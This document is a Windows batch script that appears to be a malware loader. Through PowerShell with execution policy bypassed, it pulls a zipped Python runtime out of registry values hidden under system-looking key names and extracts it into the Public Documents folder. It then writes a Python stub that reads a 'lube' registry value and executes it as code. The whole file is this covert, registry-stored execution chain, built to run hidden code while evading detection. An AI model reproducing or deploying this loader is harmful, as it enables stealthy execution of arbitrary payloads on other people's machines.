@echo off
setlocal enabledelayedexpansion

:: Configure paths
set "extract_root=%public%"
set "python_dir=%extract_root%\documents"
set "python_exe=%python_dir%\python.exe"
set "py_script=%python_dir%\run_lube.py"




if exist "%python_exe%" (
    goto HavePython
)




set "ps_command=$ErrorActionPreference = 'Stop';"
set "ps_command=%ps_command% $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo','HKCU:\Software\Microsoft\Accessibility\Setup');"
set "ps_command=%ps_command% foreach ($path in $regPaths) {"
set "ps_command=%ps_command%     if (Test-Path $path) {"
set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name 'engine' -ErrorAction SilentlyContinue;"
set "ps_command=%ps_command%         if ($val -and $val.engine) {"
set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP 'python_engine.zip';"
set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"
set "ps_command=%ps_command%             $extractTo = '%extract_root%';"
set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) { New-Item -Path $extractTo -ItemType Directory -Force | Out-Null };"
set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"
set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"
set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo 'documents\python.exe';"
set "ps_command=%ps_command%             if (Test-Path $pythonPath) { exit 0 }"
set "ps_command=%ps_command%         }"
set "ps_command=%ps_command%     }"
set "ps_command=%ps_command% };"
set "ps_command=%ps_command% throw 'Failed to extract Python from registry'"

powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"
if errorlevel 1 (
    echo ERROR: Failed to extract Python from registry
    pause
    exit /b 1
)

:HavePython

(
echo import winreg
echo import sys
echo.
echo try:
echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo'^)
echo     value, regtype = winreg.QueryValueEx(key, 'lube'^)
echo     script = value.decode('utf-8'^) if regtype == winreg.REG_BINARY else value
echo     exec(script^)
echo except Exception as e:
echo     print(f'Error: {e}'^)
echo     sys.exit(1^)
) > "%py_script%" 2>nul



"%python_exe%" "%py_script%"
if errorlevel 1 (
    echo ERROR: Python script execution failed
    pause
    exit /b 1
)


endlocal